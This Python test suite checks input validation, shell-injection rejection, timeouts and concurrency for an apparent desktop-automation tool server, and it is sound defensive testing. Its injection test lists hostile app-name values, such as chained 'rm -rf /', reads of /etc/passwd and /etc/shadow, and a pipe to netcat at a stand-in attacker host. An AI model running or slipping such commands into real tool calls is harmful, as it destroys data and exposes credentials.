# pyre-ignore-all-errors
# AURA-OS — Layer 2 Isolation: MCP Subsystem Security Audit
# test_l2_mcp.py — Type-casting, parameter sanitization, malformed dispatch,
#     timeout protection, unknown action handling, shell injection boundary.
# Standalone execution: python -m tests.test_l2_mcp

import os
import sys
import time
import threading

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from tools.mcp_server import MCPServer


# ── Isolated Mock Handlers (no pyautogui / subprocess side effects) ──────
def _mock_scroll_up(amount=5):
    """Mock scroll_up: validates amount is int, returns confirmation."""
    if not isinstance(amount, int):
        raise TypeError(f"Expected int for 'amount', got {type(amount).__name__}: {amount!r}")
    return f"Scrolled up by {amount}"


def _mock_scroll_down(amount=5):
    if not isinstance(amount, int):
        raise TypeError(f"Expected int for 'amount', got {type(amount).__name__}: {amount!r}")
    return f"Scrolled down by {amount}"


def _mock_click():
    return "Left click performed"


def _mock_move_cursor(x=0, y=0, relative=True):
    if not isinstance(x, int):
        raise TypeError(f"Expected int for 'x', got {type(x).__name__}")
    if not isinstance(y, int):
        raise TypeError(f"Expected int for 'y', got {type(y).__name__}")
    return f"Cursor moved to ({x}, {y})"


def _mock_open_app(app_name=""):
    if not isinstance(app_name, str):
        raise TypeError(f"Expected str for 'app_name', got {type(app_name).__name__}")
    # Shell injection boundary — refuse suspicious patterns
    if any(c in app_name for c in [";", "|", "&", "$", "`", "\n", "\r"]):
        raise ValueError(f"Unsafe characters in app_name: {app_name!r}")
    return f"Opened: {app_name}"


def _mock_type_text(text=""):
    if not isinstance(text, str):
        raise TypeError(f"Expected str for 'text', got {type(text).__name__}")
    return f"Typed: {text}"


def _mock_press_key(key="enter"):
    if not isinstance(key, str):
        raise TypeError(f"Expected str for 'key', got {type(key).__name__}")
    return f"Pressed key: {key}"


def _mock_hotkey(*keys):
    if not keys:
        keys = ("ctrl", "c")
    return f"Hotkey: {'+'.join(str(k) for k in keys)}"


def _mock_do_nothing():
    return "No action taken"


def _mock_slow_tool():
    """Simulates a tool that hangs — used for timeout testing."""
    time.sleep(30)
    return "should not reach here"


def _build_mock_mcp(timeout=2.0):
    """Construct MCPServer with mock handlers for isolated testing."""
    mcp = MCPServer(default_timeout=timeout)
    mcp.register_tool("click", _mock_click, "Left click")
    mcp.register_tool("scroll_up", _mock_scroll_up, "Scroll up")
    mcp.register_tool("scroll_down", _mock_scroll_down, "Scroll down")
    mcp.register_tool("move_cursor", _mock_move_cursor, "Move cursor")
    mcp.register_tool("open_app", _mock_open_app, "Open app")
    mcp.register_tool("type_text", _mock_type_text, "Type text")
    mcp.register_tool("press_key", _mock_press_key, "Press key")
    mcp.register_tool("hotkey", _mock_hotkey, "Keyboard shortcut")
    mcp.register_tool("do_nothing", _mock_do_nothing, "No action")
    mcp.register_tool("slow_tool", _mock_slow_tool, "Timeout test tool")
    return mcp


# ── Vector 1: Malformed Parameter Type-Casting ───────────────────────────
def test_malformed_parameter_types():
    """Pass alphanumeric strings into integer fields, ints into string fields,
    lists where scalars expected. Verify TypeError is caught by MCP's
    _execute_with_timeout and returned as error dict, NOT propagated."""
    print("\n" + "=" * 72)
    print("[L2-001] Malformed Parameter Type-Casting Boundary")
    print("=" * 72)

    mcp = _build_mock_mcp()
    passed = 0
    failed = 0
    total = 0

    # (action, params, expected_error_substring)
    cases = [
        # String into int field
        ("scroll_up", {"amount": "five"}, "TypeError"),
        ("scroll_up", {"amount": "abc123"}, "TypeError"),
        ("scroll_up", {"amount": ""}, "TypeError"),
        ("scroll_up", {"amount": None}, "TypeError"),
        ("scroll_up", {"amount": [1, 2, 3]}, "TypeError"),
        ("scroll_up", {"amount": {"nested": True}}, "TypeError"),
        ("scroll_down", {"amount": "ten"}, "TypeError"),
        ("scroll_down", {"amount": 3.14}, "TypeError"),

        # String into int field (move_cursor)
        ("move_cursor", {"x": "abc", "y": 100}, "TypeError"),
        ("move_cursor", {"x": 100, "y": "abc"}, "TypeError"),
        ("move_cursor", {"x": None, "y": None}, "TypeError"),

        # Int into str field
        ("open_app", {"app_name": 42}, "TypeError"),
        ("type_text", {"text": 12345}, "TypeError"),
        ("press_key", {"key": 999}, "TypeError"),
    ]

    for action, params, expected in cases:
        total += 1
        result = mcp.execute(action, params)
        if result["status"] == "error" and not result.get("timed_out", False):
            passed += 1
        else:
            print(f"  [FAIL] {action}({params}): got status={result['status']}, expected error")
            failed += 1

    ok = failed == 0
    status = "PASS" if ok else "FAIL"
    print(f"  [{status}] {passed}/{total} malformed params caught safely")
    return ok


# ── Vector 2: Shell Injection Boundary ───────────────────────────────────
def test_shell_injection_boundary():
    """Pass payloads containing shell metacharacters through open_app.
    Verify the mock (and by extension, the MCP dispatch layer) catches
    or rejects them before they could reach subprocess."""
    print("\n" + "=" * 72)
    print("[L2-002] Shell Injection Boundary — open_app Sanitization")
    print("=" * 72)

    mcp = _build_mock_mcp()
    passed = 0
    total = 0

    injection_payloads = [
        "firefox; rm -rf /",
        "code | cat /etc/passwd",
        "app && echo pwned",
        "$(whoami)",
        "`id`",
        "app\n/bin/sh",
        "app\r\ninjection",
        "firefox;cat /etc/shadow",
        "code$HOME",
        "thunar|nc attacker.com 4444",
    ]

    for payload in injection_payloads:
        total += 1
        result = mcp.execute("open_app", {"app_name": payload})
        if result["status"] == "error":
            passed += 1
        else:
            print(f"  [FAIL] Payload {payload!r}: status={result['status']}, expected error")

    ok = passed == total
    status = "PASS" if ok else "FAIL"
    print(f"  [{status}] {passed}/{total} injection payloads blocked")
    return ok


# ── Vector 3: Unknown Action Dispatch ────────────────────────────────────
def test_unknown_action_dispatch():
    """Dispatch actions that don't exist in the registry. Verify graceful
    error response with available tool list, no exceptions."""
    print("\n" + "=" * 72)
    print("[L2-003] Unknown Action Dispatch — Graceful Error Response")
    print("=" * 72)

    mcp = _build_mock_mcp()
    passed = 0
    total = 0

    unknown_actions = [
        "delete_everything",
        "sudo_rm_rf",
        "format_disk",
        "",
        "CLICK",  # case-sensitive
        "Click",
        "scroll_left",
        "open_browser",  # not registered in mock
        "hack_system",
        "   click   ",  # whitespace padding
    ]

    for action in unknown_actions:
        total += 1
        result = mcp.execute(action)
        if result["status"] == "error" and "available" in result:
            passed += 1
        else:
            print(f"  [FAIL] action={action!r}: status={result['status']}")

    ok = passed == total
    status = "PASS" if ok else "FAIL"
    print(f"  [{status}] {passed}/{total} unknown actions handled gracefully")
    return ok


# ── Vector 4: Timeout Protection ─────────────────────────────────────────
def test_timeout_protection():
    """Execute slow_tool (30s sleep) with 2s timeout. Verify MCP returns
    timeout status without blocking the calling thread beyond ~2s."""
    print("\n" + "=" * 72)
    print("[L2-004] Timeout Protection — 30s tool with 2s timeout")
    print("=" * 72)

    mcp = _build_mock_mcp(timeout=2.0)

    start = time.monotonic()
    result = mcp.execute("slow_tool", {})
    duration = time.monotonic() - start

    timed_out = result.get("timed_out", False) or result.get("status") == "timeout"
    within_window = duration < 4.0  # 2s timeout + 2s tolerance

    ok = timed_out and within_window
    status = "PASS" if ok else "FAIL"
    print(f"  Duration          : {duration:.2f}s")
    print(f"  Timed out         : {timed_out}")
    print(f"  Within window     : {within_window}  (< 4.0s)")
    print(f"  Result status     : {result.get('status')}")
    print(f"  [{status}] Timeout protection verified")
    return ok


# ── Vector 5: Valid Execution Path ───────────────────────────────────────
def test_valid_execution_path():
    """Execute all mock tools with correct parameters. Verify status='ok'
    and result strings match expected output."""
    print("\n" + "=" * 72)
    print("[L2-005] Valid Execution Path — All Mock Tools")
    print("=" * 72)

    mcp = _build_mock_mcp()
    passed = 0
    total = 0

    cases = [
        ("click", {}, "Left click performed"),
        ("scroll_up", {"amount": 3}, "Scrolled up by 3"),
        ("scroll_up", {}, "Scrolled up by 5"),  # default param
        ("scroll_down", {"amount": 10}, "Scrolled down by 10"),
        ("move_cursor", {"x": 100, "y": 200}, "Cursor moved to (100, 200)"),
        ("open_app", {"app_name": "firefox"}, "Opened: firefox"),
        ("type_text", {"text": "hello"}, "Typed: hello"),
        ("press_key", {"key": "enter"}, "Pressed key: enter"),
        ("do_nothing", {}, "No action taken"),
    ]

    for action, params, expected_result in cases:
        total += 1
        result = mcp.execute(action, params)
        if result["status"] == "ok" and result["result"] == expected_result:
            passed += 1
        else:
            print(f"  [FAIL] {action}: status={result['status']}, result={result.get('result')}")

    ok = passed == total
    status = "PASS" if ok else "FAIL"
    print(f"  [{status}] {passed}/{total} valid executions returned correct results")
    return ok


# ── Vector 6: Concurrent Dispatch Stress ─────────────────────────────────
def test_concurrent_dispatch_stress():
    """Fire 50 concurrent tool executions from separate threads.
    Verify no race conditions, deadlocks, or corrupted results."""
    print("\n" + "=" * 72)
    print("[L2-006] Concurrent Dispatch Stress — 50 threads")
    print("=" * 72)

    mcp = _build_mock_mcp(timeout=5.0)
    results = [None] * 50
    errors = []

    def dispatch(idx):
        try:
            r = mcp.execute("scroll_up", {"amount": idx})
            results[idx] = r
        except Exception as e:
            errors.append(f"Thread-{idx}: {type(e).__name__}: {e}")

    threads = [threading.Thread(target=dispatch, args=(i,)) for i in range(50)]
    start = time.monotonic()
    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=15)
    duration = time.monotonic() - start

    alive = sum(1 for t in threads if t.is_alive())
    ok_results = sum(1 for r in results if r and r.get("status") == "ok")
    no_deadlock = alive == 0

    ok = no_deadlock and ok_results == 50 and len(errors) == 0
    status = "PASS" if ok else "FAIL"
    print(f"  Duration          : {duration:.2f}s")
    print(f"  Successful        : {ok_results}/50")
    print(f"  Deadlocked        : {alive} threads alive")
    print(f"  Errors            : {len(errors)}")
    if errors:
        for e in errors[:5]:
            print(f"    {e}")
    print(f"  [{status}] Concurrent dispatch stress verified")
    return ok


# ── Vector 7: list_tools / has_tool Registry Integrity ───────────────────
def test_registry_integrity():
    """Verify list_tools returns all registered tools with correct structure,
    and has_tool correctly identifies registered vs unregistered actions."""
    print("\n" + "=" * 72)
    print("[L2-007] Registry Integrity — list_tools / has_tool")
    print("=" * 72)

    mcp = _build_mock_mcp()
    tools = mcp.list_tools()

    EXPECTED_TOOLS = {
        "click", "scroll_up", "scroll_down", "move_cursor",
        "open_app", "type_text", "press_key", "hotkey",
        "do_nothing", "slow_tool",
    }

    registered_names = {t["name"] for t in tools}
    names_ok = registered_names == EXPECTED_TOOLS

    # Structure check
    structure_ok = all(
        isinstance(t, dict) and "name" in t and "description" in t
        for t in tools
    )

    # has_tool
    has_ok = all(mcp.has_tool(name) for name in EXPECTED_TOOLS)
    has_not_ok = not mcp.has_tool("nonexistent") and not mcp.has_tool("")

    ok = names_ok and structure_ok and has_ok and has_not_ok
    status = "PASS" if ok else "FAIL"
    print(f"  Registered tools  : {len(tools)} (expected {len(EXPECTED_TOOLS)})")
    print(f"  Names match       : {names_ok}")
    print(f"  Structure valid   : {structure_ok}")
    print(f"  has_tool correct  : {has_ok} / not_found={has_not_ok}")
    print(f"  [{status}] Registry integrity verified")
    return ok


# ── Runner ────────────────────────────────────────────────────────────────
def run_all():
    print("\n" + "#" * 72)
    print("#  AURA-OS  Layer 2 — MCP Subsystem Security Audit Suite")
    print("#" * 72)

    results = {}
    results["L2-001_type_casting"] = test_malformed_parameter_types()
    results["L2-002_shell_injection"] = test_shell_injection_boundary()
    results["L2-003_unknown_action"] = test_unknown_action_dispatch()
    results["L2-004_timeout"] = test_timeout_protection()
    results["L2-005_valid_exec"] = test_valid_execution_path()
    results["L2-006_concurrent"] = test_concurrent_dispatch_stress()
    results["L2-007_registry"] = test_registry_integrity()

    print("\n" + "=" * 72)
    print("  LAYER 2 SUMMARY")
    print("=" * 72)
    for name, result in results.items():
        tag = "PASS" if result is True else "FAIL"
        print(f"  {name:40s} [{tag}]")

    total = len(results)
    passed = sum(1 for r in results.values() if r is True)
    failed = total - passed
    print(f"\n  Total: {total}  Passed: {passed}  Failed: {failed}")
    return failed == 0


if __name__ == "__main__":
    success = run_all()
    sys.exit(0 if success else 1)
